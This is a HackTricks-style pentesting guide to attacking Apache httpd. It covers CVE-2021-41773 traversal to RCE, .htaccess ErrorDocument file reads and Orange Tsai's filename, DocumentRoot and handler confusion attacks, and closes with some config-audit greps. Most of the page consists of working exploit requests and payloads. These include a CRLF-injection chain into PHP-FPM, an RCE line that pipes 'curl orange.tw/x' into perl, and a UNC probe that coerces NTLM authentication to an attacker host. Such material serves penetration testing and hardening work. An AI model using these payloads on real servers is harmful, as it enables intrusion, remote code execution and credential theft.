_body: "# Apache\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Executable PHP extensions\n\nCheck which extensions\
  \ is executing the Apache server. To search them you can execute:\n\n```bash\n grep -R -B1 \"httpd-php\" /etc/apache2\n\
  ```\n\nAlso, some places where you can find this configuration is:\n\n```bash\n/etc/apache2/mods-available/php5.conf\n/etc/apache2/mods-enabled/php5.conf\n\
  /etc/apache2/mods-available/php7.3.conf\n/etc/apache2/mods-enabled/php7.3.conf\n```\n\n## CVE-2021-41773\n\n```bash\ncurl\
  \ http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'\nuid=1(daemon)\
  \ gid=1(daemon) groups=1(daemon)\nLinux\n```\n\n## LFI via .htaccess ErrorDocument file provider (ap_expr)\n\nIf you can\
  \ control a directory’s .htaccess and AllowOverride includes FileInfo for that path, you can turn 404 responses into arbitrary\
  \ local file reads using the ap_expr file() function inside ErrorDocument.\n\n- Requirements:\n  - Apache 2.4 with expression\
  \ parser (ap_expr) enabled (default in 2.4).\n  - The vhost/dir must allow .htaccess to set ErrorDocument (AllowOverride\
  \ FileInfo).\n  - The Apache worker user must have read permissions on the target file.\n\n.htaccess payload:\n\n```apache\n\
  # Optional marker header just to identify your tenant/request path\nHeader always set X-Debug-Tenant \"demo\"\n# On any\
  \ 404 under this directory, return the contents of an absolute filesystem path\nErrorDocument 404 %{file:/etc/passwd}\n\
  ```\n\nTrigger by requesting any non-existing path below that directory, for example when abusing userdir-style hosting:\n\
  \n```bash\ncurl -s http://target/~user/does-not-exist | sed -n '1,20p'\n```\n\nNotes and tips:\n- Only absolute paths work.\
  \ The content is returned as the response body for the 404 handler.\n- Effective read permissions are those of the Apache\
  \ user (typically www-data/apache). You won’t read /root/* or /etc/shadow in default setups.\n- Even if .htaccess is root-owned,\
  \ if the parent directory is tenant-owned and permits rename, you may be able to rename the original .htaccess and upload\
  \ your own replacement via SFTP/FTP:\n  - rename .htaccess .htaccess.bk\n  - put your malicious .htaccess\n- Use this to\
  \ read application source under DocumentRoot or vhost config paths to harvest secrets (DB creds, API keys, etc.).\n\n##\
  \ Confusion Attack <a href=\"#a-whole-new-attack-confusion-attack\" id=\"a-whole-new-attack-confusion-attack\"></a>\n\n\
  These types of attacks has been introduced and documented [**by Orange in this blog post**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)\
  \ and the following is a summary. The \"confusion\" attack basically abuses how the tens of modules that work together creating\
  \ a Apache don't work perfectly synchronised and making some of them modify some unexpected data can cause a vulnerability\
  \ in a later module.\n\n### Filename Confusion\n\n#### Truncation\n\nThe **`mod_rewrite`** will trim the content of `r->filename`\
  \ after the character `?` ([_**modules/mappers/mod_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)).\
  \ This isn't totally wrong as most modules will treat `r->filename` as an URL. Bur in other occasions this will be treated\
  \ as file path, which would cause a problem.\n\n- **Path Truncation**\n\nIt's possible to abuse `mod_rewrite` like in the\
  \ following rule example to access other files inside the file system, removing the last part of the expected path adding\
  \ simply a `?`:\n\n```bash\nRewriteEngine On\nRewriteRule \"^/user/(.+)$\" \"/var/user/$1/profile.yml\"\n\n# Expected\n\
  curl http://server/user/orange\n# the output of file `/var/user/orange/profile.yml`\n\n# Attack\ncurl http://server/user/orange%2Fsecret.yml%3F\n\
  # the output of file `/var/user/orange/secret.yml`\n```\n\n- **Mislead RewriteFlag Assignment**\n\nIn the following rewrite\
  \ rule, as long as the URL ends in .php it's going to be treated and executed as php. Therefore, it's possible send a URL\
  \ that ends in .php after the `?` char while loading in the path a different type of file (like an image) with malicious\
  \ php code inside of it:\n\n```bash\nRewriteEngine On\nRewriteRule  ^(.+\\.php)$  $1  [H=application/x-httpd-php]\n\n# Attacker\
  \ uploads a gif file with some php code\ncurl http://server/upload/1.gif\n# GIF89a <?=`id`;>\n\n# Make the server execute\
  \ the php code\ncurl http://server/upload/1.gif%3fooo.php\n# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\
  ```\n\n#### **ACL Bypass**\n\nIt's possible to access files the user shouldn't be able to access even if the access should\
  \ be denied with configurations like:\n\n```xml\n<Files \"admin.php\">\n    AuthType Basic\n    AuthName \"Admin Panel\"\
  \n    AuthUserFile \"/etc/apache2/.htpasswd\"\n    Require valid-user\n</Files>\n```\n\nThis is because by default PHP-FPM\
  \ will receive URLs ending in `.php`, like `http://server/admin.php%3Fooo.php` and because PHP-FPM will remove anything\
  \ after the character `?`, the previous URL will allow to load `/admin.php` even if the previous rule prohibited it.\n\n\
  ### DocumentRoot Confusion\n\n```bash\nDocumentRoot /var/www/html\nRewriteRule  ^/html/(.*)$   /$1.html\n```\n\nA fun fact\
  \ about Apache is that the previous rewrite will try to access the file from both the documentRoot and from root. So, a\
  \ request to `https://server/abouth.html` will check for the file in `/var/www/html/about.html` and `/about.html` in the\
  \ file system. Which basically can be abused to access files in the file system.\n\n#### **Server-Side Source Code Disclosure**\n\
  \n- **Disclose CGI Source Code**\n\nJust adding a %3F at the end is enough to leak the source code of a cgi module:\n\n\
  ```bash\ncurl http://server/cgi-bin/download.cgi\n # the processed result from download.cgi\ncurl http://server/html/usr/lib/cgi-bin/download.cgi%3F\n\
  \ # #!/usr/bin/perl\n # use CGI;\n # ...\n # # the source code of download.cgi\n```\n\n- **Disclose PHP Source Code**\n\n\
  If a server has different domains with one of them being a static domain, this can be abused to traverse the file system\
  \ and leak php code:\n\n```bash\n# Leak the config.php file of the www.local domain from the static.local domain\ncurl http://www.local/var/www.local/config.php%3F\
  \ -H \"Host: static.local\"\n # the source code of config.php\n```\n\n#### **Local Gadgets Manipulation**\n\nThe main problem\
  \ with the previous attack is that by default most access over the filesystem will be denied as in Apache HTTP Server’s\
  \ [configuration template](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115):\n\n```xml\n<Directory\
  \ />\n    AllowOverride None\n    Require all denied\n</Directory>\n```\n\nHowever, [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165)\
  \ operating systems by default allow `/usr/share`:\n\n```xml\n<Directory /usr/share>\n    AllowOverride None\n    Require\
  \ all granted\n</Directory>\n```\n\nTherefore, it would be possible to **abuse files located inside `/usr/share` in these\
  \ distributions.**\n\n**Local Gadget to Information Disclosure**\n\n- **Apache HTTP Server** with **websocketd** may expose\
  \ the **dump-env.php** script at **/usr/share/doc/websocketd/examples/php/**, which can leak sensitive environment variables.\n\
  - Servers with **Nginx** or **Jetty** might expose sensitive web application information (e.g., **web.xml**) through their\
  \ default web roots placed under **/usr/share**:\n  - **/usr/share/nginx/html/**\n  - **/usr/share/jetty9/etc/**\n  - **/usr/share/jetty9/webapps/**\n\
  \n**Local Gadget to XSS**\n\n- On Ubuntu Desktop with **LibreOffice installed**, exploiting the help files' language switch\
  \ feature can lead to **Cross-Site Scripting (XSS)**. Manipulating the URL at **/usr/share/libreoffice/help/help.html**\
  \ can redirect to malicious pages or older versions through **unsafe RewriteRule**.\n\n**Local Gadget to LFI**\n\n- If PHP\
  \ or certain front-end packages like **JpGraph** or **jQuery-jFeed** are installed, their files can be exploited to read\
  \ sensitive files like **/etc/passwd**:\n  - **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**\n  - **/usr/share/javascript/jquery-jfeed/proxy.php**\n\
  \  - **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**\n\n**Local Gadget to SSRF**\n\n- Utilizing **MagpieRSS's\
  \ magpie_debug.php** at **/usr/share/php/magpierss/scripts/magpie_debug.php**, an SSRF vulnerability can be easily created,\
  \ providing a gateway to further exploits.\n\n**Local Gadget to RCE**\n\n- Opportunities for **Remote Code Execution (RCE)**\
  \ are vast, with vulnerable installations like an outdated **PHPUnit** or **phpLiteAdmin**. These can be exploited to execute\
  \ arbitrary code, showcasing the extensive potential of local gadgets manipulation.\n\n#### **Jailbreak from Local Gadgets**\n\
  \nIt's also possible to jailbreak from the allowed folders by following symlinks generated by installed software in those\
  \ folders, like:\n\n- **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`\n- **Solr Data**: `/usr/share/solr/data/`\
  \ -> `/var/lib/solr/data`\n- **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`\n- **MediaWiki Config**: `/usr/share/mediawiki/config/`\
  \ -> `/var/lib/mediawiki/config/`\n- **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`\n\
  \nMoreover, abusing symlinks it was possible to obtain **RCE in Redmine.**\n\n### Handler Confusion <a href=\"#id-3-handler-confusion\"\
  \ id=\"id-3-handler-confusion\"></a>\n\nThis attack exploits the overlap in functionality between the `AddHandler` and `AddType`\
  \ directives, which both can be used to **enable PHP processing**. Originally, these directives affected different fields\
  \ (`r->handler` and `r->content_type` respectively) in the server's internal structure. However, due to legacy code, Apache\
  \ handles these directives interchangeably under certain conditions, converting `r->content_type` into `r->handler` if the\
  \ former is set and the latter is not.\n\nMoreover, in the Apache HTTP Server (`server/config.c#L420`), if `r->handler`\
  \ is empty before executing `ap_run_handler()`, the server **uses `r->content_type` as the handler**, effectively making\
  \ `AddType` and `AddHandler` identical in effect.\n\n#### **Overwrite Handler to Disclose PHP Source Code**\n\nIn [**this\
  \ talk**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf),\
  \ was presented a vulnerability where an incorrect `Content-Length` sent by a client can cause Apache to mistakenly **return\
  \ the PHP source code**. This was because an error handling issue with ModSecurity and the Apache Portable Runtime (APR),\
  \ where a double response leads to overwriting `r->content_type` to `text/html`.\\\nBecause ModSecurity doesn't properly\
  \ handle return values, it would return the PHP code and won't interpret it.\n\n#### **Overwrite Handler to XXXX**\n\nTODO:\
  \ Orange hasn't disclose this vulnerability yet\n\n### **Invoke Arbitrary Handlers**\n\nIf an attacker is able to control\
  \ the **`Content-Type`** header in a server response he is going to be able to **invoke arbitrary module handlers**. However,\
  \ by the point the attacker controls this, most of the process of the request will be done. However, it's possible to **restart\
  \ the request process abusing the `Location` header** because if the **r**eturned `Status` is 200 and the `Location` header\
  \ starts with a `/`, the response is treated as a Server-Side Redirection and should be processed\n\nAccording to [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875)\
  \ (specification about CGI) in [Section 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) defines a Local\
  \ Redirect Response behavior:\n\n> The CGI script can return a URI path and query-string (‘local-pathquery’) for a local\
  \ resource in a Location header field. This indicates to the server that it should reprocess the request using the path\
  \ specified.\n\nTherefore, to perform this attack is needed one of the following vulns:\n\n- CRLF Injection in the CGI response\
  \ headers\n- SSRF with complete control of the response headers\n\n#### **Arbitrary Handler to Information Disclosure**\n\
  \nFor example `/server-status` should only be accessible locally:\n\n```xml\n<Location /server-status>\n    SetHandler server-status\n\
  \    Require local\n</Location>\n```\n\nIt's possible to access it setting the `Content-Type` to `server-status` and the\
  \ Location header starting with `/`\n\n```\nhttp://server/cgi-bin/redir.cgi?r=http:// %0d%0a\nLocation:/ooo %0d%0a\nContent-Type:server-status\
  \ %0d%0a\n%0d%0a\n```\n\n#### **Arbitrary Handler to Full SSRF**\n\nRedirecting to `mod_proxy` to access any protocol on\
  \ any URL:\n\n```\nhttp://server/cgi-bin/redir.cgi?r=http://%0d%0a\nLocation:/ooo %0d%0a\nContent-Type:proxy:\nhttp://example.com/%3F\n\
  \ %0d%0a\n%0d%0a\n```\n\nHowever, the `X-Forwarded-For` header is added preventing access to cloud metadata endpoints.\n\
  \n#### **Arbitrary Handler to Access Local Unix Domain Socket**\n\nAccess PHP-FPM’s local Unix Domain Socket to execute\
  \ a PHP backdoor located in `/tmp/`:\n\n```\nhttp://server/cgi-bin/redir.cgi?r=http://%0d%0a\nLocation:/ooo %0d%0a\nContent-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php\
  \ %0d%0a\n%0d%0a\n```\n\n#### **Arbitrary Handler to RCE**\n\nThe official [PHP Docker](https://hub.docker.com/_/php) image\
  \ includes PEAR (`Pearcmd.php`), a command-line PHP package management tool, which can be abused to obtain RCE:\n\n```\n\
  http://server/cgi-bin/redir.cgi?r=http://%0d%0a\nLocation:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}\norange.tw/x|perl\n\
  ) %2b alltests.php %0d%0a\nContent-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php\
  \ %0d%0a\n%0d%0a\n```\n\nCheck [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp),\
  \ written by [Phith0n](https://x.com/phithon_xg) for the details of this technique.\n\n## Recent Apache 2.4.60+ notes worth\
  \ testing\n\n### Hunt for `UnsafeAllow3F` and `UnsafePrefixStat`\n\nApache 2.4.60 introduced two opt-in `mod_rewrite` flags\
  \ that effectively re-enable dangerous legacy behavior after the 2024 hardening work. From an attacker perspective, if you\
  \ find them in a target config, the older confusion-style primitives become interesting again:\n\n- `UnsafeAllow3F`: Allows\
  \ rewrites to continue when the request contains an encoded `?` (`%3f`) and the rewritten substitution also contains a literal\
  \ `?`. This is exactly the pattern behind `?`-based truncation / handler confusion tricks.\n- `UnsafePrefixStat`: Allows\
  \ server-scoped substitutions that start with a backreference or variable and resolve to a filesystem path without forcing\
  \ a safe DocumentRoot prefix first. This is the dangerous pattern behind path escapes and unexpected local file resolution.\n\
  \nQuick audit:\n\n```bash\ngrep -RInE 'UnsafeAllow3F|UnsafePrefixStat|RewriteRule' /etc/apache2 /usr/local/apache2/conf\
  \ 2>/dev/null\n```\n\nIf those flags are present, re-test:\n\n- `%3f` in attacker-controlled captures that later influence\
  \ `RewriteRule` substitutions or handler selection.\n- Server/vhost scoped rewrites where the first path segment comes from\
  \ `$1`, `%{ENV:*}`, `%{HTTP:*}`, or similar attacker-influenced variables.\n\n### Windows UNC / NTLM coercion\n\nOn Windows\
  \ deployments, recent Apache research showed that unsafe path handling can be turned into outbound SMB authentication to\
  \ an attacker-controlled host. This matters whenever untrusted input reaches `mod_rewrite`, `ap_expr`, or type-map resolution.\n\
  \nInteresting conditions:\n\n- `AllowEncodedSlashes On`\n- On newer 2.4 builds after the request parser rewrite, `MergeSlashes\
  \ Off` may also be required to reach the vulnerable path parsing behavior\n- Debian/Ubuntu style `AddHandler type-map var`\
  \ can make uploaded `.var` files interesting on Windows too\n\nBasic probe:\n\n```bash\ncurl http://server/%5C%5Cattacker-server/path/to\n\
  ```\n\nIf the request is accepted and the server is Windows-based, Apache may attempt to resolve a UNC path and coerce NTLM\
  \ authentication to `attacker-server`. In real intranet environments, treat this as more than \"just SSRF\": the leaked\
  \ authentication can often be chained into NTLM relay.\n\nIf file upload is available and `type-map` support is enabled,\
  \ a malicious `.var` file whose `URI` points to a UNC path can trigger the same class of outbound authentication.\n\n###\
  \ `AddType`-based handler mappings are still a high-value audit target\n\nThe Handler Confusion section above is not only\
  \ theoretical. Apache 2.4.60 and 2.4.61 had regressions where legacy content-type based handler mappings such as `AddType\
  \ application/x-httpd-php .php` could disclose source code when files were requested indirectly instead of directly. Apache\
  \ 2.4.62 fixed the regression, but this remains a good pentest check because many environments still rely on legacy `AddType`\
  \ mappings.\n\nQuick audit:\n\n```bash\ngrep -RInE 'AddType\\s+application/x-httpd-php|AddType\\s+.*x-httpd' /etc/apache2\
  \ /usr/local/apache2/conf 2>/dev/null\n```\n\nIf you find `AddType` instead of `SetHandler` / `AddHandler`, compare direct\
  \ requests with any indirect request path that reaches the same script through an internal rewrite, local redirect, or `ErrorDocument`\
  \ chain. Look for cases where PHP is suddenly served as text/plain / text/html instead of being executed.\n\n## References\n\
